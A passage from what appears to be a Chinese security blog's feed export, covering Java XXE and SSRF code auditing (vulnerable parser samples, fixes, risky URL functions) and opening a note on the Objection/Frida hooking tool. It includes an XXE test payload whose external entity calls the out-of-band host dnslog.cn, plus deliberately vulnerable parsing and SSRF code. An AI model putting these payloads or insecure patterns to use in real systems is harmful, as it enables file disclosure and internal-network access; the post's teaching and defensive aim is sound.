class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">            builder.build(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pom.xml</code>中引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不存在<code>XXE</code>漏洞的情况。</p><ul><li>方式一</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.build(InputSource);</span><br></pre></td></tr></table></figure><ul><li>方式二</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.build(InputSource);</span><br></pre></td></tr></table></figure><h4 id="org-dom4j-io-SAXReader">org.dom4j.io.SAXReader</h4><p>在默认情况下会出现<code>XXE</code>漏洞。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAXReader saxReader = new SAXReader();</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></table></figure><p>不存在<code>XXE</code>漏洞的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></table></figure><h4 id="javax-xml-parsers-DocumentBuilder">javax.xml.parsers.DocumentBuilder</h4><p>存在<code>XXE</code>漏洞的测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DocumentBuilderFactoryXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// 创建DocumentBuilderFactory实例</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="comment">// 创建DocumentBuilder实例</span></span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">            <span class="comment">// 解析XML字符串</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> builder.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">            document.getDocumentElement().normalize();</span><br><span class="line">            <span class="comment">// 获取根元素</span></span><br><span class="line">            <span class="type">Element</span> <span class="variable">root</span> <span class="operator">=</span> document.getDocumentElement();</span><br><span class="line">            System.out.println(<span class="string">&quot;Root element: &quot;</span> + root.getTagName());</span><br><span class="line">            <span class="comment">// 遍历子节点</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nodeList</span> <span class="operator">=</span> root.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodeList.getLength(); i++) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nodeList.item(i);</span><br><span class="line">                <span class="keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Node: &quot;</span> + node.getNodeName() + <span class="string">&quot; , Text: &quot;</span> + node.getTextContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParserConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SAXException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>错误的修复。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="type">String</span> <span class="variable">FEATURE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">FEATURE = <span class="string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 读取xml文件内容</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;path/to/xxexml&quot;</span>);</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(fis);</span><br><span class="line">builder.parse(is);</span><br></pre></td></tr></table></figure><p>看似设置得很很全面，但是直接仍然会被攻击，原因就是在于<code>DocumentBuilder builder = dbf.newDocumentBuilder();</code>这行代码需要在<code>dbf.setFeature()</code>之后才能够生效；⚠️⚠️⚠️</p><p><strong>正确的修复</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"><span class="type">String</span> <span class="variable">FEATURE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">FEATURE = <span class="string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="comment">// 读取xml文件内容</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;path/to/xxexml&quot;</span>);</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(fis);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(is);</span><br></pre></td></tr></table></figure><p>注意<code>DocumentBuilder builder = dbf.newDocumentBuilder();</code>在两种不同的位置的差异性。</p><h4 id="其它同理">其它同理</h4><p>通过对不同的<code>XML</code>解析库的修复方式可以发现，<code>XXE</code>的防护只需要限制带外实体的注入就可以了，修复方式也简单，需要设置几个选项为<code>false</code>即可，可能少许的几个库可能还需要设置一些其他的配置，但是都是类似的。</p><p>总体来说修复方式都是通过<code>setFeature</code>的方式来防御<code>XXE</code>。</p><ul><li>方法一</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true </span><br><span class="line">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false</span><br><span class="line">&quot;http://xml.org/sax/features/external-general-entities&quot;, false</span><br><span class="line">&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false</span><br></pre></td></tr></table></figure><ul><li>方式二</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;</span><br><span class="line">XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;</span><br></pre></td></tr></table></figure><p>本质上<code>XXE</code>的问题就是一个配置不当的问题，即容易发现也容易防御，但是前提是需要知道这个漏洞。很多程序员并不知道<code>XXE</code>，所以才会写出含有漏洞的代码。</p><h2 id="SSRF">SSRF</h2><blockquote><p><code>SSRF</code>漏洞其实就是代码中有一个可以访问内网的接口，用户可以通过控制这个请求的接口，进而访问内网。<code>SSRF</code>不只是仅限于代码中请求<code>URL</code>的函数，<code>XXE</code>也可以作为<code>SSRF</code>的接口的，还有一些代码可以解析<code>xml</code>，<code>html</code>等文件，通过控制这些文件的内容也是可以实现<code>SSRF</code>。</p></blockquote><p>在<code>Java</code>中支持的协议类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http https file ftp mailto jar netdoc</span><br></pre></td></tr></table></figure><h3 id="可能存在问题的函数">可能存在问题的函数</h3><p>代码中常用的可能存在<code>SSRF</code>的函数如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URLConnection.getInputStream</span><br><span class="line">HttpVlient.execute</span><br><span class="line">Request.Get.execute</span><br><span class="line">Request.Post.execute</span><br><span class="line">URL.openStream</span><br><span class="line">ImageIO.read</span><br></pre></td></tr></table></figure><p>根据函数名称，快速定位函数，分析函数的参数是否可控，进而确认是否存在<code>SSRF</code>漏洞。</p><h3 id="测试实例-2">测试实例</h3><h4 id="HttpURLConnection-getInputStream">HttpURLConnection.getInputStream</h4><p>就是<code>URL</code>可控就行了，比较简单。有时候会存在对<code>URL</code>过滤的情况，这时候需要进行绕过，可以参考我之前写的<code>SSRF</code>绕过内容<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.ssrf;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpURLConnectionSSRF</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//假设这里是用户可控的URL</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">targetUrl</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1&quot;</span>;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(targetUrl);</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">            <span class="comment">//获取输入流，并读取响应</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(connection.getInputStream())))&#123;</span><br><span class="line">                String inputLine;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="keyword">while</span>((inputLine = in.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    content.append(inputLine);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(content.toString());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//关闭连接</span></span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HttpCLient-execute">HttpCLient.execute</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.ssrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClients;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpClientSSRF</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建HttpClient实例</span></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClients.createDefault()) &#123;</span><br><span class="line">            <span class="comment">// 创建HttpGet实例</span></span><br><span class="line">            <span class="type">HttpGet</span> <span class="variable">http</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;http://115.120.233.255:8787&quot;</span>);</span><br><span class="line">            <span class="comment">// 执行请求并获取响应</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> httpClient.execute(http)) &#123;</span><br><span class="line">                <span class="comment">//检查响应状态码</span></span><br><span class="line">                <span class="keyword">if</span>(response.getStatusLine().getStatusCode()==<span class="number">200</span>)&#123;</span><br><span class="line">                    <span class="comment">//读取响应内容</span></span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(response.getEntity().getContent()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                        body.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;response body: &quot;</span>+body.toString());</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;request failed: &quot;</span>+response.getStatusLine().getStatusCode());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="其它同理-2">其它同理</h4><p>比较简单，这里就不再举例。</p><h2 id="RCE">RCE</h2><p><code>Java</code>中的<code>RCE</code>中的方式两种：</p><h3 id="aaa">aaa</h3><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://www.runoob.com/servlet/servlet-life-cycle.html">https://www.runoob.com/servlet/servlet-life-cycle.html</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/9w4Rzr-P1ph41VSCmmc_Hg">https://mp.weixin.qq.com/s/9w4Rzr-P1ph41VSCmmc_Hg</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://r17a-17.github.io/2021/09/04/Java-XXE漏洞总结/</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://blog.spoock.com/2018/10/23/java-xxe/">https://blog.spoock.com/2018/10/23/java-xxe/</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://x2nn.github.io/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/#SSRF%E7%9A%84%E7%BB%95%E8%BF%87">https://x2nn.github.io/2024/07/25/SSRF漏洞篇/#SSRF的绕过</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> XXE </tag>
            
            <tag> SSRF </tag>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Objection笔记</title>
      <link href="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/03/21/Objection%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="一、确认要hook的apk">一、确认要hook的apk</h3><p>我使用的环境是真机环境，使用<code>USB</code>连接手机。安装的<code>Objection</code>的版本为<code>1.11.0</code>。这里注意，真机的<code>frida-server</code>的版本要和你电脑的<code>frida</code>版本一致，我是用的是<code>15.2.2</code>的<code>frida</code>。</p><p>使用<code>frida-ps -U</code>找到自己要查看的包名，可能是<code>com.x2n.xxx</code>的形式也可能是中文的名字。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250321235259345.png" alt="image-20250321235259345"></p><p>找到自己的包，然后使用<code>objection -g com.x2n.xxx explore</code>进入到<code>REPL</code>模式。这里<code>com.x2n.xxx</code>为中文也可，中文时我使用<code>&quot;&quot;</code>进行包裹。我使用的<code>1.11.0</code>的<code>objection</code>支持中文，其它版本我不确定。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250321235804595.png" alt="image-20250321235804595"></p><h3 id="二、常用的命令">二、常用的命令</h3><p>进入到<code>Objection REPL</code>界面<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>中，当不知道命令时通过按空格就会提示可用的命令。在出现提示后通过上下选择键及回车键便可以输入  命令。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250322000716481.png" alt="image-20250322000716481"></p><p>下面以手机自带的<code>com.android.phone</code>为例，开始介绍正式的使用命令。</p><h4 id="1、help命令">1、help命令</h4><p>当不知道当前命令的效果是什么时，在当前命令前加上help（比如help env）再回车之后就会出现当前命令的解释信息。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323165012672.png" alt="image-20250323165012672"></p><h4 